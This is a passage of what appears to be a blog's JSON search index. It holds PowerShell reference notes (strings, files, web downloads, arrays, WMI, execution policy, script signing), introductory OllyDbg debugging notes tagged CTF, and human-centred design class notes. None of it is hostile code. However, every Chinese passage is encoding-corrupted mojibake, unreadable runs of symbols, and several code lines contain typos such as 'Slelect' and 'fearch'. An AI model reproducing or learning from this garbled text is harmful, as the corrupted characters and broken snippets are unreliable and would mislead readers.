Â≠óÁ¨¶‰∏≤Âú®Âè¶‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÁöÑ‰ΩçÁΩÆÔºöIndexOf()ÊõøÊç¢ÊñáÊú¨Ôºö.Replace(\"World\",\"Powershell\")Â≠óÁ¨¶‰∏≤Â§ßÂ∞èÂÜôËΩ¨Êç¢Ôºö\"\".ToUpper(),\"\".ToLower()ÂéªÊéâÂ≠óÁ¨¶‰∏≤ÁöÑÁ©∫Ê†ºÔºöTrim()5.12ËΩ¨Êç¢ÊñáÊú¨ÊµÅ‰∏∫ÂØπË±°ÊõøÊç¢ÊñáÊú¨ÔºöSedÊêúÁ¥¢ÊñáÊú¨ÔºöGrep6.ËÆ°ÁÆó‰∏éÊï∞Â≠¶ËÆ°ÁÆó6.3Â∫¶Èáè‰∏Ä‰∏™ÂàóË°®ÁöÑÁªüËÆ°Â±ûÊÄßMeasure-Object -Average -Sum -Property Length7.ÁÆÄÂçïÊñá‰ª∂7.1Ëé∑ÂèñÊñá‰ª∂ÂÜÖÂÆπGet-Content C:\\file.txt${ C:\\file.txt }//-Delimiter ‰øÆÊîπÊç¢Ë°åÊ†áËØÜ//ReadCountËÆæÁΩÆËØªÂèñÁöÑË°åÊï∞//‰∏ÄÊ¨°ËØªÂèñÊâÄÊúâÊñá‰ª∂ÔºåÂ§ÑÁêÜÂ§ßÊñá‰ª∂Êó∂ÈúÄË¶ÅÊ†ºÂ§ñÂ∞èÂøÉ[File]::ReadAllText()7.2ÊêúÁ¥¢Êñá‰ª∂ÁöÑÊñáÊú¨Select-String-Simple ‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜô//‰ΩøÁî®Ê≠£ÂàôË°®ËææÂºèÈÄíÂΩíÊêúÁ¥¢ÊâÄÊúâÊñá‰ª∂Âêç‰∏∫.txtÁöÑÊñá‰ª∂ÔºåÂ∞ÜGet-ChilditemÁöÑÁªìÊûúÈÄöËøáÁÆ°ÈÅìËæìÂá∫ÁªôSelect-StringGet-ChildItem -Filter *.txt -Recurse | Select-String pattern//ÂΩìÂâçÁõÆÂΩï‰∏ãÊêúÁ¥¢Êâ©Â±ïÂêç‰∏∫DLLÁöÑÊñá‰ª∂ÊòØÂê¶ÂåÖÂê´‚ÄúDebug‚ÄùGet-ChildItem | Where { $_ | Select-String \"Debug\" -Quiet }7.5ÂàõÂª∫‰∏¥Êó∂Êñá‰ª∂$filename = [System.IO.Path]::GetTempFileName()Remove-Item -Force $filename8.ÁªìÊûÑÂåñÊñá‰ª∂8.1ËÆøÈóÆXMLÊñá‰ª∂‰∏≠ÁöÑ‰ø°ÊÅØ$xml = [xml] (Get-Content $filename)8.4ÂØºÂÖ•ÂØºÂá∫ÁªìÊûÑÂåñÊï∞ÊçÆExport-CliXmlImport-CliXml9.ÊîØÊåÅInternetÁöÑËÑöÊú¨9.1‰ªéInternet‰∏ãËΩΩ‰∏Ä‰∏™Êñá‰ª∂$wc = New-Object System.Net.WebClient$wc.DownloadFile($source, $destination)//‰∏ãËΩΩWebÈ°µÈù¢$content = $wc.DownloadString($source)9.5Â∞ÜÂëΩ‰ª§ÁöÑËæìÂá∫ÁîüÊàê‰∏Ä‰∏™WebÈ°µÈù¢ConvertTo-Html9.7‰∏éInternetÂçèËÆÆ‰∫§‰∫í10.‰ª£Á†ÅÂ§çÁî®10.2ÁºñÂÜô‰∏Ä‰∏™ÂáΩÊï∞param([double] $fahrenheit)\t//ËÑöÊú¨ÁöÑÂΩ¢ÂèÇ$celsius = $fahrenheit -32\t//Êìç‰Ωú$celsius = $celsius / 1.8\"$fahrenheit degrees Fahrenheit is $celsius degrees Celsius.\" //ËæìÂá∫10.3ËÑöÊú¨//ËÑöÊú¨Âùó Map-Object//‰ΩøÁî®Â∫ìËÑöÊú¨$scriptDirectory = Split-Path $myInvocation.MyCommand.Path.(Join-Path $scriptDirectory LibraryTemperature.ps1)//ËÆøÈóÆÁÆ°ÈÅìÊï∞ÊçÆ    $input10.8Áî®ÂëΩ‰ª§ÂÖ≥ÈîÆÂ≠ó(Cmdlet Keywords)ÁºñÂÜôÈù¢ÂêëÁÆ°ÈÅìÁöÑËÑöÊú¨//ÊääËÑöÊú¨ÂàÜ‰∏∫ÂàùÂßãÂåñ„ÄÅÂ§ÑÁêÜÂíåÊ∏ÖÈô§function{begin{}process{}end{}}//‰ΩøÁî®fearch($element in $input)ËÆøÈóÆËæìÂÖ•ÁÆ°ÈÅìÁöÑÂÖÉÁ¥†//Èù¢ÂêëÁÆ°ÈÅìÁöÑÂáΩÊï∞\t\tfilter‰ª£Êõøfunction11.ÂàóË°®„ÄÅÊï∞ÁªÑÂíåhashË°®//ËµãÂÄºÂàóË°®Áî®ÈÄóÂè∑ÂàÜÈöî$Array = 1,2,\"Hello World\"//Êñ∞Âª∫Êï∞ÁªÑ$myArray = New-Object string [] 10//ÂàõÂª∫Â§öÁª¥Êï∞ÁªÑ$jagged = @(    (1,2,3,4)    (5,6,7,8))//ËÆøÈóÆÊï∞ÁªÑÊØè‰∏™ÂÖÉÁ¥†Foreach_ObjectÔºåforeachÔºåforForeach_Object { $sum += $_ }foreach($element in $myArray){$sum += $element }//Êï∞ÁªÑÊéíÂ∫èGet-ChildItem | Sort-Object -Descending Length | Slelect Name,Length//Êï∞ÁªÑÂåÖÂê´ÊüêÈ°πÔºåÂåπÈÖçÔºö-eq,-like,-match\"Hello\",\"World\" - contains \"Hello\"//ÂêàÂπ∂Êï∞ÁªÑ$result = $firstArray + $secondArray//‰ªéÊï∞ÁªÑ‰∏≠ÁßªÂá∫ÂÖÉÁ¥†:-ne,-notlike,-notmatch$array = $array -ne \"Item1\"//‰ΩøÁî®ArrayListÁ±ªÂÆåÊàêÈ´òÁ∫ßÁöÑÊï∞ÁªÑ‰ªªÂä°$myArray = New-Object System.Collections.ArrayList[void] $myArray.Add(\"Hello\")[void] $myArray.AddRange((\"World\",\"how ara you\"))$myArray.RemoveAt(1)//ÂàõÂª∫hashË°®$myHashtable @{}$myHashtable = @{Key1 = \"Value1\";\"Key 2\" = 1,2,3}$myHashtable[\"New Item\"] = 5//Ëé∑ÂèñhashË°®‰∏≠ÂêÑ‰∏™ÂÖÉÁ¥†GetEnumerator()12.Áî®Êà∑‰∫§‰∫í//‰ΩøÁî®Read-Host$directory = Read-Host \"Enter a directory name\"//ËØªÂèñÁî®Êà∑ËæìÂÖ•ÁöÑÊåâÈîÆ[Console]::ReadKey()//ÁªôÁî®Êà∑ÊòæÁ§∫ËæìÂá∫ÂíåÊ∂àÊÅØWrite-Host, Out-Host//‰∏∫ÈïøÊó∂Èó¥ËøêË°åÁöÑ‰ªªÂä°Êèê‰æõËøõÂ∫¶Êõ¥Êñ∞Write-Progress//‰∏ªÊú∫ÁöÑÁî®Êà∑ÁïåÈù¢ËÆøÈóÆÂäüËÉΩ $host.UI.RawUI.WindowTitle = (Get-Location)13.Ë∑üË∏™ÂíåÈîôËØØÁÆ°ÁêÜ13.1Êü•ÁúãÁî±Êüê‰∏ÄÂëΩ‰ª§ÁîüÊàêÁöÑÈîôËØØ$error, $eooroView//Ê∏ÖÈô§ÈîôËØØ$error.Clear()$error.Count()13.2Â§ÑÁêÜË≠¶Âëä„ÄÅÈîôËØØÂíåÁªàÊ≠¢ÈîôËØØ//ÂøΩÁï•ÂìçÂ∫îË≠¶Âëä‰ø°ÊÅØ$warningPreference = \"SilentlyContinue\"//ÂøΩÁï•ÈùûÁªàÊ≠¢‰ø°ÊÅØ$errorActionPreference = \"SilentlyContinue\"13.4Ë∞ÉËØïËÑöÊú¨Write-Debug, //ÈÄêÊ≠•„ÄÅË∑üË∏™„ÄÅÁéØÂ¢ÉÊ£ÄÊü•Set-PsDebug -StepSet-PsDebug -Trace$host.EnterNestedPrompt14.ÊéåÊè°ÁéØÂ¢É$myInvocationÊèê‰æõÂΩìÂâçËÑöÊú¨„ÄÅÂáΩÊï∞ÊàñËÑöÊú¨ÂùóÁöÑÂ§ßÈáè‰ø°ÊÅØ:MyCommand:ÂëΩ‰ª§Êú¨Ë∫´ÁöÑ‰ø°ÊÅØScriptLineNumber:ÂëΩ‰ª§Ë°åÂè∑ScriptName:Ë∞ÉÁî®ÊîπÂëΩ‰ª§ÁöÑËÑöÊú¨ÂêçÁß∞Line:Âú®ËÑöÊú¨Ë°å‰∏≠Ë∞ÉÁî®ËØ•ÂëΩ‰ª§ÁöÑÊñáÊú¨InvocationName:Ë∞ÉÁî®ËØ•ÂëΩ‰ª§ÁöÑÂêçÁß∞PipelineLength:ÂëΩ‰ª§ÁÆ°ÈÅì‰∏≠ÁöÑÂëΩ‰ª§Êï∞PipelinePostion:ÁÆ°ÈÅì‰∏≠ÁöÑÂëΩ‰ª§‰ΩçÁΩÆDefinition/Path:ËÑöÊú¨ËøêË°åÂÆåÊï¥Ë∑ØÂæÑ//Á°ÆÂÆöÁ≥ªÁªüË∑ØÂæÑÂíåÁâπÊÆäÊñá‰ª∂Â§π‰ΩçÁΩÆ[Environment]::GetFolderPath(\"System\")15.Windows PowerShellÁöÑÊãìÂ±ï15.1ËÆøÈóÆWMIÊï∞ÊçÆ//Ê£ÄÁ¥¢WMIÁ±ªÁöÑÊâÄÊúâÂÆû‰æãGet-WmiObject -ComputerName Computer -Class Win32_Bios //Ê£ÄÁ¥¢WMIÁâπÂÆöÂÆû‰æãGet-WmiObject Win32_Service -Filter \"StartMode = 'Auto'\"//‰ΩøÁî®WMIÁöÑWQLËØ≠Ë®ÄÊ£ÄÁ¥¢$query = [WmiSearcher] \"SELECT * FROM Win32_Service WHERE StartMode = 'Auto'\"15.4‰ΩøÁî®.NETÊù•ÊâßË°åÈ´òÁ∫ßÁöÑWMI‰ªªÂä°//‰ΩøÁî®ÊâÄÁîüÊàêÁöÑÂØπË±°PsBaseÂ±ûÊÄß//Ëé∑Âèñ‰∏éÁªôÂÆöÁöÑÂÆû‰æãÁõ∏ÂÖ≥ÁöÑWMIÂÆû‰æãÔºåË∞ÉÁî®GetRelated()$instance = [Wmi] 'Win32_service.Name=\"winmgmt\"'$instance.PsBase.GetRelated()15.6‰ΩøÁî®COMËÑöÊú¨Êé•Âè£Ëá™Âä®ÂåñÁ®ãÂ∫è$shell = New-Object -ComObject \"Shell.Application\"$shell.Windows() | Format-Table LocationName,LocationUrl16.ÂÆâÂÖ®ÂíåËÑöÊú¨Á≠æÂêç16.1ÈÄöËøáÊâßË°åÁ≠ñÁï•ÂêØÂä®ËÑöÊú¨ Set-ExecutionPolicy RemoteSigned Restricted     ÂèóÈôê Allsigned      Á≠æÂêç Remote Signed  ËøúÁ®ãÁ≠æÂêç Unrestricted   ‰∏çÂèóÈôêÂà∂16.2ËÑöÊú¨ÊàñÊ†ºÂºèÊñá‰ª∂Á≠æÂêç$cert = @(Get-ChildItem cert:\\CurrentUser\\My -CodeSigning)[0]Set-AuthenticodeSignature file.ps1 $cert16.4ÁÆ°ÁêÜ‰ºÅ‰∏ö‰∏≠ÁöÑÂÆâÂÖ®ÊÄßÁªÑÁ≠ñÁï•Ê®°ÁâàÈÉ®ÁΩ≤ËØÅ‰π¶ÊúçÂä°Êù•‰∏∫ÂüüË¥¶Êà∑Ëá™Âä®ÁîüÊàêËØÅ‰π¶Â∫îÁî®ËΩØ‰ª∂ÈôêÂà∂Á≠ñÁï•16.5È™åËØÅËÑöÊú¨ÁöÑÊï∞Â≠óÁ≠æÂêçGet-AuthenticodeSignature16.6ÂÆâÂÖ®Âú∞Â§ÑÁêÜÊïèÊÑü‰ø°ÊÅØ$secureInput = Read-Host -AsSecureString \"Enter your Private key\""
  },
  
  {
    "title": "OllyDbgÂü∫Á°Ä",
    "url": "/posts/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/",
    "categories": "",
    "tags": "CTF",
    "date": "2017-03-10 00:00:00 -0800",
    





    
    "snippet": "1.OllyDbgÁöÑÂü∫Á°Ä1.1ËÆæÁΩÆ‚ÄúÂ§ßÊú¨Ëê•‚ÄùGotoÂëΩ‰ª§ËÆæÁΩÆÊñ≠ÁÇπÊ≥®ÈáäÊ†áÁ≠æ 1.2Ë∞ÉËØïÊñπÊ≥ï‰ª£Á†ÅÊâßË°åÊ≥ïÂ≠óÁ¨¶‰∏≤Ê£ÄÁ¥¢Ê≥ïAPIÊ£ÄÁ¥¢Ê≥ïÔºöË∞ÉÁî®‰ª£Á†Å‰∏≠ÔºèAPI‰ª£Á†Å‰∏≠ËÆæÁΩÆÊñ≠ÁÇπ1.3ÊâìË°•‰∏ÅÔºö‰øÆÊîπÂ≠óÁ¨¶‰∏≤Áõ¥Êé•‰øÆÊîπbufferÂú®ÂÖ∂‰ªñÂÜÖÂ≠òÂå∫ÂüüÁîüÊàêÊñ∞ÁöÑÂ≠óÁ¨¶‰∏≤Âπ∂‰º†ÈÄíÁªôÊ∂àÊÅØÂáΩÊï∞1.4Â∞èÁ´ØÂ∫èvsÂ§ßÁ´ØÂ∫èÔºàÊ≠£Â∏∏È°∫Â∫èÔºâ1.5ÂØÑÂ≠òÂô®1.5.1ÈÄöÁî®ÂØÑÂ≠òÂô® \tEAX:Á¥ØÂä†Âô®\tEBX:Âü∫Âú∞ÂùÄÂØÑÂ≠òÂô®\tECX:ËÆ°Êï∞Âô®\tEDX:Êï∞ÊçÆÂØÑÂ≠òÂô®\tEBP...",
    "content": "1.OllyDbgÁöÑÂü∫Á°Ä1.1ËÆæÁΩÆ‚ÄúÂ§ßÊú¨Ëê•‚ÄùGotoÂëΩ‰ª§ËÆæÁΩÆÊñ≠ÁÇπÊ≥®ÈáäÊ†áÁ≠æ 1.2Ë∞ÉËØïÊñπÊ≥ï‰ª£Á†ÅÊâßË°åÊ≥ïÂ≠óÁ¨¶‰∏≤Ê£ÄÁ¥¢Ê≥ïAPIÊ£ÄÁ¥¢Ê≥ïÔºöË∞ÉÁî®‰ª£Á†Å‰∏≠ÔºèAPI‰ª£Á†Å‰∏≠ËÆæÁΩÆÊñ≠ÁÇπ1.3ÊâìË°•‰∏ÅÔºö‰øÆÊîπÂ≠óÁ¨¶‰∏≤Áõ¥Êé•‰øÆÊîπbufferÂú®ÂÖ∂‰ªñÂÜÖÂ≠òÂå∫ÂüüÁîüÊàêÊñ∞ÁöÑÂ≠óÁ¨¶‰∏≤Âπ∂‰º†ÈÄíÁªôÊ∂àÊÅØÂáΩÊï∞1.4Â∞èÁ´ØÂ∫èvsÂ§ßÁ´ØÂ∫èÔºàÊ≠£Â∏∏È°∫Â∫èÔºâ1.5ÂØÑÂ≠òÂô®1.5.1ÈÄöÁî®ÂØÑÂ≠òÂô® \tEAX:Á¥ØÂä†Âô®\tEBX:Âü∫Âú∞ÂùÄÂØÑÂ≠òÂô®\tECX:ËÆ°Êï∞Âô®\tEDX:Êï∞ÊçÆÂØÑÂ≠òÂô®\tEBP:Êâ©Â±ïÂü∫ÂùÄÊåáÈíàÂØÑÂ≠òÂô®\tESI:Ê∫êÂèòÂùÄÂØÑÂ≠òÂô® \tEDI:ÁõÆÁöÑÂèòÂùÄÂØÑÂ≠òÂô®\tESP:Ê†àÊåáÈíàÂØÑÂ≠òÂô®1.5.2ÊÆµÂØÑÂ≠òÂô®\tCS:‰ª£Á†ÅÊÆµÂØÑÂ≠òÂô®\tSS:Ê†àÊÆµÂØÑÂ≠òÂô®\tDS:Êï∞ÊçÆÊÆµÂØÑÂ≠òÂô®\tES:ÈôÑÂä†ÊÆµÂØÑÂ≠òÂô®\tFS:Êï∞ÊçÆÊÆµÂØÑÂ≠òÂô®\tGS:Êï∞ÊçÆÊÆµÂØÑÂ≠òÂô®1.5.3Á®ãÂ∫èÁä∂ÊÄÅ‰∏éÊéßÂà∂ÂØÑÂ≠òÂô®1.5.4Êåá‰ª§ÊåáÈíàÂØÑÂ≠òÂô®1.6Ê†à"
  },
  
  {
    "title": "Human-Centered Design Class 2‚ÄîInspiration Phase",
    "url": "/posts/Class2_Inspiration_Phase/",
    "categories": "",
    "tags": "Design",
    "date": "2017-02-18 00:00:00 -0800",
    





    
    "snippet": "1.Choose a Design Challenge-Collect Thoughts-Review What You Already Know-Define What You Don't Know-Review Constraints or Barriers2.Plan Your Research MethodsA.Learn from people-Define Your Audien...",
    "content": "1.Choose a Design Challenge-Collect Thoughts-Review What You Already Know-Define What You Don't Know-Review Constraints or Barriers2.Plan Your Research MethodsA.Learn from people-Define Your Audience-Care about the extremes people not only the mainstreams-Where/How much time/How/What activity will be done during the interview-Trusted Atmosphere-Interviewee's environment,important quotes and taking photosB.Learn from experts-Experts' suggestions-Make the plan flexible-Secondary ResearchC.Immerse yourself in context-Plan your observations-Got what you see-Write it downD.Analogous inspiration-Brainstorm analogous experiences-Don't worry about wasting time3.Build Your Interview Guide-Identify objectives:Why/How/Who-Tell useful and inspiring feedback-Organize your questions:open and deep-Share early ideas and concepts before conversation-Comfirm your plan-Different roles have different assignments4.Additional Research Methods-Participants' diaries-Photo-Journey or map-Card Sorts5.Capture Your Learnings-Share your impressions-Illustrate new ideas####Case Study:VroomChildren‚Äôs readiness for kindergarten (and life beyond) hinges on positive engagement with their parents and caregivers during the  rst  ve years of their lives."
  }
  
]

